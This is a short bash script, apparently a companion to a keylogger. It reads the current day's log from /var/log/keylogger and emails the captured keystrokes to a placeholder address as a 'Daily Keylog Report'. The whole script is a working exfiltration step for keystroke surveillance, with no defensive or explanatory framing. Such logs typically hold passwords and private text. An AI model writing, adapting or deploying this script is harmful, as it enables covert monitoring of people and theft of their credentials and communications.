#!/bin/bash

LOG_DIR="/var/log/keylogger"
LOG_FILE="$LOG_DIR/$(date +'%Y-%m-%d').log"
MAIL_RECIPIENT="admin@example.com"
SUBJECT="Daily Keylog Report - $(date +'%Y-%m-%d')"

if [ -s "$LOG_FILE" ]; then
    cat "$LOG_FILE" | mail -s "$SUBJECT" "$MAIL_RECIPIENT"
    echo "Email sent to $MAIL_RECIPIENT"
else
    echo "No keystrokes recorded today."
fi
